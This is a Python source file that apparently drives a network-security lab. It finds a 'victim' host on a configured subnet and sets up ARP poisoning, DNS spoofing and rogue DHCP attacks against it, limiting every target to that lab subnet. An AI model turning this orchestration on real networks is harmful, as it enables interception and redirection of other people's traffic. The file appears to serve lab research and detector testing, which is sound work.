#!/usr/bin/env python3
from __future__ import annotations

from ipaddress import ip_address

from lab.config import LabSettings
from lab.network import HostRecord, interface_ipv4, interface_on_subnet, scan_subnet
from mitm.attacks import ArpPoisoner, DnsSpoofer, RogueDhcpServer


class LabResearchRunner:
    def __init__(self, settings: LabSettings, interface: str) -> None:
        self.settings = settings
        self.interface = interface
        self._validate_interface_scope()

    def _validate_interface_scope(self) -> None:
        if not interface_on_subnet(self.interface, str(self.settings.lab_subnet)):
            raise RuntimeError(
                f"Interface {self.interface} is not on lab subnet {self.settings.lab_subnet}"
            )

    def _validate_host(self, ip: str) -> None:
        if ip_address(ip) not in self.settings.lab_subnet:
            raise RuntimeError(f"{ip} is outside the configured lab subnet {self.settings.lab_subnet}")

    def discover_hosts(self) -> list[HostRecord]:
        return scan_subnet(str(self.settings.lab_subnet), self.interface)

    def attacker_ip(self) -> str:
        return interface_ipv4(self.interface)

    def discover_victim(self) -> HostRecord:
        gateway_ip = str(self.settings.gateway_ip)
        attacker_ip = self.attacker_ip()
        victim_mac_hint = self.settings.raw.get("VICTIM_MAC", "").lower()
        attacker_mac_hint = self.settings.raw.get("ATTACKER_MAC", "").lower()
        gateway_mac_hint = self.settings.raw.get("GATEWAY_LAB_MAC", "").lower()

        hosts = self.discover_hosts()
        candidates = [
            host
            for host in hosts
            if host.ip not in {gateway_ip, attacker_ip}
            and host.mac not in {attacker_mac_hint, gateway_mac_hint}
        ]

        if victim_mac_hint:
            for host in candidates:
                if host.mac == victim_mac_hint:
                    return host

        if len(candidates) == 1:
            return candidates[0]

        if not candidates:
            raise RuntimeError("Unable to discover a victim host on the lab subnet")

        raise RuntimeError(
            "Unable to choose a victim host automatically; discovered candidates: "
            + ", ".join(f"{host.ip}/{host.mac}" for host in candidates)
        )

    def build_arp_poisoner(
        self,
        victim_ip: str | None = None,
        gateway_ip: str | None = None,
        interval: float = 2.0,
    ) -> ArpPoisoner:
        victim = victim_ip or self.discover_victim().ip
        gateway = gateway_ip or str(self.settings.gateway_ip)
        self._validate_host(victim)
        self._validate_host(gateway)
        return ArpPoisoner(
            interface=self.interface,
            victim_ip=victim,
            gateway_ip=gateway,
            interval=interval,
        )

    def build_dns_spoofer(
        self,
        answer_ip: str | None = None,
        domains: list[str] | None = None,
        victim_ip: str | None = None,
    ) -> DnsSpoofer:
        answer = answer_ip or self.attacker_ip()
        self._validate_host(answer)
        victim = victim_ip or self.discover_victim().ip
        self._validate_host(victim)
        selected_domains = domains or list(self.settings.detector_domains)
        records = {domain: answer for domain in selected_domains}
        return DnsSpoofer(
            interface=self.interface,
            records=records,
            victim_ip=victim,
            attacker_ip=self.attacker_ip(),
            gateway_ip=str(self.settings.gateway_ip),
        )

    def build_rogue_dhcp_server(
        self,
        victim_ip: str | None = None,
        victim_mac: str | None = None,
        server_ip: str | None = None,
        offered_ip: str | None = None,
        interval: float = 2.0,
        include_ack: bool = True,
    ) -> RogueDhcpServer:
        victim = self.discover_victim()
        if victim_ip and victim.ip != victim_ip:
            self._validate_host(victim_ip)
        selected_victim_mac = (victim_mac or victim.mac).lower()
        selected_server_ip = server_ip or self.attacker_ip()
        selected_offered_ip = offered_ip or str(self.settings.lab_subnet[-2])
        self._validate_host(selected_server_ip)
        self._validate_host(selected_offered_ip)
        return RogueDhcpServer(
            interface=self.interface,
            server_ip=selected_server_ip,
            offered_ip=selected_offered_ip,
            victim_mac=selected_victim_mac,
            gateway_ip=str(self.settings.gateway_ip),
            interval=interval,
            include_ack=include_ack,
        )
